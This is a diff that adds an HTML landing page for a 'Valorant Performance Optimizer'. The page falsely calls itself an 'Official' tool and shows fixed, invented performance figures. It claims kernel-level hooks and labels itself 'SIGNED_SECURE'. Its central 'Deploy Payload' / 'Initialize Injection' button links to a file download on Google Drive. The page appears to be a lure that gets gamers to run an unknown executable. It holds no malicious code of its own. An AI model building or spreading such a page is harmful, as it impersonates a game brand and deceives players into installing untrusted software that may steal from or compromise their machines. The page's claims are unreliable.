@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VALORANT Performance Optimizer | Frame Stability & Latency Engine</title>
+    <meta name="description" content="Official performance optimization tool for Valorant. Achieve zero latency, stable frame rates, and network optimization with our tactical performance stack.">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://fps-boost-valorant.com/">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "SoftwareApplication",
+      "name": "Valorant Performance Optimizer",
+      "operatingSystem": "Windows 10/11",
+      "applicationCategory": "UtilitiesApplication",
+      "description": "Tactical latency and frame stability optimizer for Valorant."
+    }
+    </script>
+
+    <style>
+        :root {
+            --val-red: #ff4655;
+            --val-dark: #0f1923;
+            --val-blue: #00bcd4;
+        }
+
+        body {
+            background-color: var(--val-dark);
+            color: #ece8e1;
+            font-family: 'DIN Next LT Pro', sans-serif;
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at 50% 50%, rgba(255, 70, 85, 0.05) 0%, transparent 70%);
+        }
+
+        .clip-panel { clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px); }
+        .clip-btn { clip-path: polygon(0 0, 100% 0, 95% 100%, 5% 100%); }
+
+        .scanline {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.1) 51%);
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .glow-red { box-shadow: 0 0 15px rgba(255, 70, 85, 0.3); }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+        }
+
+        @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .animate-pulse-slow { animation: pulse-red 3s infinite; }
+    </style>
+</head>
+<body class="min-h-screen p-4 md:p-8">
+    <div class="scanline"></div>
+
+    <header class="flex justify-between items-end border-b border-white/10 pb-6 mb-12">
+        <div>
+            <div class="text-xs tracking-[0.3em] text-[var(--val-red)] font-bold mb-2">VALORANT / PERFORMANCE</div>
+            <h1 class="text-5xl font-black uppercase italic tracking-tighter">Tactical Frame Optimizer</h1>
+        </div>
+        <div class="text-right">
+            <div class="text-sm font-mono text-white/50">SYSTEM_STATUS: <span class="text-[var(--val-red)] animate-pulse-slow">ONLINE</span></div>
+            <div class="text-sm font-mono text-white/50">NETWORK_LATENCY: 8ms</div>
+        </div>
+    </header>
+
+    <main class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+        
+        <section class="lg:col-span-8 bg-[#16202a] p-6 clip-panel border border-white/5">
+            <h2 class="text-xl font-bold uppercase tracking-widest mb-6">Performance Telemetry</h2>
+            <div class="data-grid text-center">
+                <div class="border border-white/10 p-4">
+                    <div class="text-3xl font-black italic">+42%</div>
+                    <div class="text-[10px] uppercase text-white/40">Frame Stability</div>
+                </div>
+                <div class="border border-white/10 p-4">
+                    <div class="text-3xl font-black italic">-12ms</div>
+                    <div class="text-[10px] uppercase text-white/40">Input Latency</div>
+                </div>
+                <div class="border border-white/10 p-4">
+                    <div class="text-3xl font-black italic">0.0%</div>
+                    <div class="text-[10px] uppercase text-white/40">Packet Loss</div>
+                </div>
+            </div>
+            
+            <div class="mt-8 p-6 bg-black/30 border border-white/5">
+                <p class="text-white/60 leading-relaxed font-light">
+                    Deep-level engine optimization protocol. Hooks into the kernel-level resource scheduler to prioritize Valorant game threads over background telemetry and non-essential system overhead.
+                </p>
+            </div>
+        </section>
+
+        <section class="lg:col-span-4 bg-[#16202a] p-8 clip-panel flex flex-col justify-center items-center gap-6 border-l-4 border-l-[var(--val-red)]">
+            <div class="text-center">
+                <div class="text-xs uppercase text-white/50 tracking-widest mb-2">Primary Module</div>
+                <div class="text-2xl font-black uppercase">Initialize Injection</div>
+            </div>
+            
+            <a href="https://drive.google.com/file/d/1e73qTVLJxUPnC9FrjnsiO4TMZ7HDd6FK/view?usp=sharing" 
+               class="w-full py-6 bg-[var(--val-red)] clip-btn hover:scale-[1.02] transition-transform text-center font-black uppercase tracking-tighter text-2xl shadow-[0_0_20px_rgba(255,70,85,0.4)]">
+                Deploy Payload
+            </a>
+            
+            <div class="text-[10px] text-white/30 font-mono tracking-widest text-center">
+                V2.6.0_BETA / SIGNED_SECURE
+            </div>
+        </section>
+    </main>
+
+    <footer class="mt-16 pt-8 border-t border-white/10 grid grid-cols-2 lg:grid-cols-4 gap-8">
+        <div>
+            <div class="text-[10px] uppercase text-[var(--val-red)] mb-2">Protocol</div>
+            <div class="text-sm font-light">Frame Stacking</div>
+        </div>
+        <div>
+            <div class="text-[10px] uppercase text-[var(--val-red)] mb-2">Optimization</div>
+            <div class="text-sm font-light">Direct Memory</div>
+        </div>
+        <div>
+            <div class="text-[10px] uppercase text-[var(--val-red)] mb-2">Stability</div>
+            <div class="text-sm font-light">Kernel Managed</div>
+        </div>
+        <div class="text-right">
+            <div class="text-[10px] uppercase text-[var(--val-red)] mb-2">Version</div>
+            <div class="text-sm font-light">2026.04.12</div>
+        </div>
+    </footer>
+</body>
+</html>
